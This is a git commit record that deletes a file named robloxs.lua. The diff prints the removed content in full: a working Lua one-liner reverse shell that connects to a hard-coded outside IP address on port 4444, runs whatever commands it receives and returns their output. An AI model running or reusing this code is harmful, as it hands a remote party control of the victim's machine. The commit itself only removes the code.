59142da03c17609d784f77c4c43bc9d38cade345
WEXNON <125816778+WEXNON@users.noreply.github.com>
2023-07-21 23:57:54 +0300

    Delete robloxs.lua

--- robloxs.lua
+++
@@ -1,3 +0,0 @@
-lua5.1 -e 'local host, port = "91.109.180.2", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
-
-
